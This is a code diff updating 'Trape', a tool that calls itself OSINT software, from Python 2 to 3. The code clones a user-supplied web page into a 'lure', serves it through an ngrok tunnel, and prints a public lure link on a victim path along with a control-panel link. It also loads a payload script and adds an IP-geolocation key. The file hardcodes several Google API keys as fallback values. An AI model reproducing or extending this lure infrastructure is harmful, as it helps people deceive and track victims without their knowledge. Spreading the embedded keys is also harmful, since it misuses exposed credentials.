@@ -13,8 +13,9 @@
 #**
 import time
 import json
+import urllib
 from core.dependence import urllib2
-import httplib 
+import http.client 
 import argparse
 import socket
 import sys
@@ -30,8 +31,8 @@ import atexit
 class Trape(object):
 	def __init__(self, stat = 0):
 		self.name_trape = "Trape"
-		self.version = "2.0"
-		self.stats_path = utils.generateToken(7)
+		self.version = "2.1"
+		self.stats_path = "ngrok"
 		self.home_path = utils.generateToken(18)
 		self.logout_path = utils.generateToken(6)
 		self.remove_path = utils.generateToken(14)
@@ -42,11 +43,11 @@ class Trape(object):
 		self.localIp = '127.0.0.1'
 		self.nGrokUrl = ''
 
-		self.JSFiles = ({"path" : "base.js", "src" : utils.generateToken(12)},{"path" : "libs.min.js", "src" : utils.generateToken(12)},{"path" : "login.js", "src" : utils.generateToken(12)},{"path" : "payload.js", "src" : utils.generateToken(12)},{"path" : "trape.js", "src" : utils.generateToken(12)},{"path" : "vscript.js", "src" : utils.generateToken(12)},)
-		self.CSSFiles = ({"path" : "static/img/favicon.ico", "src" : utils.generateToken(12)},{"path" : "static/img/favicon.png", "src" : utils.generateToken(12)},{"path" : "static/css/base-icons.css", "src" : utils.generateToken(12)},{"path" : "static/css/styles.css", "src" : utils.generateToken(12)},{"path" : "static/css/normalize.min.css", "src" : utils.generateToken(12)},{"path": "static/css/services-icons.css", "src" : utils.generateToken(12)},)
+		self.JSFiles = ({"path" : "base.js", "src" : utils.generateToken(12)},{"path" : "libs.min.js", "src" : utils.generateToken(12)},{"path" : "login.js", "src" : utils.generateToken(12)},{"path" : "payload.js", "src" : utils.generateToken(12)},{"path" : "trape.js", "src" : utils.generateToken(12)},{"path" : "vscript.js", "src" : utils.generateToken(12)},{"path" : "custom.js", "src" : utils.generateToken(12)},)
+		self.CSSFiles = ({"path" : "/static/img/favicon.ico", "src" : utils.generateToken(12)},{"path" : "/static/img/favicon.png", "src" : utils.generateToken(12)},{"path" : "/static/css/base-icons.css", "src" : utils.generateToken(12)},{"path" : "/static/css/styles.css", "src" : utils.generateToken(12)},{"path" : "/static/css/normalize.min.css", "src" : utils.generateToken(12)},{"path": "/static/css/services-icons.css", "src" : utils.generateToken(12)},)
 
 		if self.stat == 1:
-			c = httplib.HTTPConnection('www.google.com', timeout=5)
+			c = http.client.HTTPConnection('www.google.com', timeout=5)
 			try:
 				c.request("HEAD", "/")
 				c.close()
@@ -66,13 +67,14 @@ class Trape(object):
 
 			self.ngrok = config_trape['ngrok_token']
 			self.gmaps = config_trape['gmaps_api_key']
+			self.ipinfo = config_trape['ipinfo_api_key']
 			if self.gmaps == '':
 				self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'
 			self.googl = config_trape['gshortener_api_key']
 			if self.googl == '':
 				self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'
 			
-			parser = argparse.ArgumentParser("python trape.py -u <<Url>> -p <<Port>>", version=self.version)
+			parser = argparse.ArgumentParser("python3 trape.py -u <<Url>> -p <<Port>>")
 			parser.add_argument('-u', '--url', dest='url', help='Put the web page url to clone')
 			parser.add_argument('-p', '--port', dest='port', help='Insert your port')
 			parser.add_argument('-ak', '--accesskey', dest='accesskey', help='Insert your custom key access')
@@ -100,15 +102,15 @@ class Trape(object):
 				utils.Go("----------------------------------------------")
 				utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Osint and analytics tool" + " " + "<" +utils.Color['white'])
 				utils.Go("----------------------------------------------")
-				utils.Go("| v" + utils.Color['redBold'] + "2.0" + utils.Color['white'] + " |")    
+				utils.Go("| v" + utils.Color['redBold'] + self.version + utils.Color['white'] + " |")    
 				utils.Go("--------" + "\n")
 				utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['greenBold'] + "!" + utils.Color['whiteBold'] + "]" + " " + utils.Color['white'] + "Enter the information requested below to complete the execution" + utils.Color['white'])
 				utils.Go("")
 
-				options.url = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+				options.url = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 
 			if options.port is None:
-				options.port = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+				options.port = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 
 			while utils.checkPort(int(options.port)) == False:
 				utils.Go("\033[H\033[J")
@@ -117,10 +119,10 @@ class Trape(object):
 				utils.Go("----------------------------------------------")
 				utils.Go("\n")
 				utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR:" + " " + utils.Color['whiteBold'] + "The port: " + options.port + utils.Color['white'] + " " + "is not available, It was previously used (" + utils.Color['yellow'] + "Use another port" + utils.Text['end'] + ")" + "\n\n")
-				options.port = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+				options.port = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your port to generate the server?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 
 			#while utils.checkUrl(str(options.url)) == False:
-				options.url = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+				options.url = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter a URL to generate the lure" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 
 
 			utils.Go("")
@@ -142,7 +144,7 @@ class Trape(object):
 			if (options.ngrok or (self.ngrok != "")):
 				if self.ngrok == '':
 					utils.Go("\033[H\033[J")
-					self.ngrok = raw_input("What is your nGrok token?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+					self.ngrok = input("What is your nGrok token?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 				if (self.ngrok != ''):
 					from core.ngrok import ngrok
 					import os.path as path
@@ -189,20 +191,14 @@ class Trape(object):
 				if self.googl == '':
 					self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'
 				try:
-					opener = urllib2.build_opener()
-					time.sleep(1.5)
-					fileLog = open(self.stats_path + '.nlog', 'r') 
-					log = fileLog.read().replace('\n', '').replace(' ', '')
-					pLog = log.find('127.0.0.1:') + 10
-					pLog = int(log[pLog:pLog+4])
-					fileLog.close()
-					os.remove(self.stats_path + '.nlog')
-					ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/status').read()).replace('\n', '').replace(' ', '')
+					opener = urllib.request.build_opener()
+					pLog = 4040
+					ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\n', '').replace(' ', '')
 					time.sleep(0.5)
 					ngrokUrlPos = ngrokStatus.find('ngrok.io')
 					if ngrokUrlPos <= 0:
 						time.sleep(4)
-						ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/status').read()).replace('\n', '').replace(' ', '')
+						ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\n', '').replace(' ', '')
 						ngrokUrlPos = ngrokStatus.find('ngrok.io')
 					if ngrokUrlPos >= 0:
 						ngrokStatus = ngrokStatus[ngrokUrlPos-25:ngrokUrlPos+28]
@@ -212,15 +208,9 @@ class Trape(object):
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "PUBLIC INFORMATION" + utils.Text['end'])
 						utils.Go("\t" + "-------------------")
 						r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)
-						gooGl = json.loads(r._content)
-						if r.status_code == 200:
-							utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Link shortened lure: " + utils.Color['blue'] + gooGl['id']  + utils.Color['white'] + " " + "(share)")
-						else:
-							utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " gooGl " + utils.Color['white'] + gooGl['error']['errors'][0]['reason'])
 						self.nGrokUrl = ngrokStatus.replace('https', 'http')
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Public lure: " + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel link: " + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])
-
 					else:
 						utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" + utils.Color['red'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " We can't connect with nGrok " + utils.Color['white'])
 				except Exception as e:
@@ -249,7 +239,7 @@ class Trape(object):
 		utils.Go("----------------------------------------------------------")
 		utils.Go("" + " " + utils.Color['redBold'] + "TRAPE" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Configuration zone to use the software" + " " + "<" + utils.Color['white'])
 		utils.Go("----------------------------------------------------------")
-		utils.Go("| v" + utils.Color['redBold'] + "2.0" + utils.Color['white'] + " |")    
+		utils.Go("| v" + utils.Color['redBold'] + self.version + utils.Color['white'] + " |")    
 		utils.Go("--------" + "\n")
 		utils.Go(utils.Color['whiteBold'] + "GENERAL CONFIG" + utils.Color['white'])
 		utils.Go("------")
@@ -259,20 +249,26 @@ class Trape(object):
 		utils.Go("------")
 		utils.Go("In the next section you must enter your Ngrok token, if you do not have \none register at (" + utils.Color['blueBold'] + "https://ngrok.com" + utils.Color['white'] + "), this data is necessary for the generation of public network tunnels.")
 		utils.Go("")
-		c_nGrokToken = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter your ngrok token" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+		c_nGrokToken = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter your ngrok token" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 		utils.Go("")
 		utils.Go(utils.Color['whiteBold'] + "GOOGLE API" + utils.Color['white'])
 		utils.Go("------")
 		utils.Go("You must register with the " + utils.Color['blueBold'] + "Google Console" + utils.Color['white'] + ", and get an API for maps and another for shortening. \nBy having these data you complete the settings")
 		utils.Go("")
-		c_gMapsToken = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your Google Maps Api Key?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
-		c_gOoglToken = raw_input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+		c_gMapsToken = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your Google Maps Api Key?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+		c_gOoglToken = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " Enter your Goo.gl (shortener) Api Key (leave it empty if you don't have)" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
+		utils.Go("")
+		utils.Go(utils.Color['whiteBold'] + "IP INFO API" + utils.Color['white'])
+		utils.Go("------")
+		utils.Go("You must register with the " + utils.Color['blueBold'] + "https://ipgeolocation.io" + utils.Color['white'] + ", and get an API for geolocation. \nBy having these data you complete the settings")
+		utils.Go("")
+		c_ipinfo = input(utils.Color['blueBold'] + "-" + utils.Color['white'] + " What is your IP Info Api Key?" + " " + utils.Color['yellow'] + ":~> " + utils.Color['white'])
 		utils.Go("")
 		utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Congratulations! " + utils.Color['greenBold'] + "Successful configuration" + utils.Color['white'] + ", now enjoy Trape!" + utils.Color['white'])
 		utils.Go("")
 		time.sleep(0.4)
 		if (c_nGrokToken != '' and c_gMapsToken != ''):
-			v = '{\n\t"ngrok_token" : "' + c_nGrokToken + '",\n\t"gmaps_api_key" : "' + c_gMapsToken + '",\n\t"gshortener_api_key" : "' + c_gOoglToken + '"\n\t}'
+			v = '{\n\t"ngrok_token" : "' + c_nGrokToken + '",\n\t"gmaps_api_key" : "' + c_gMapsToken + '",\n\t"gshortener_api_key" : "' + c_gOoglToken + '",\n\t"ipinfo_api_key" : "' + c_ipinfo + '"\n}'
 			f = open ('trape.config', 'w')
 			f.write(v)
 			f.close()
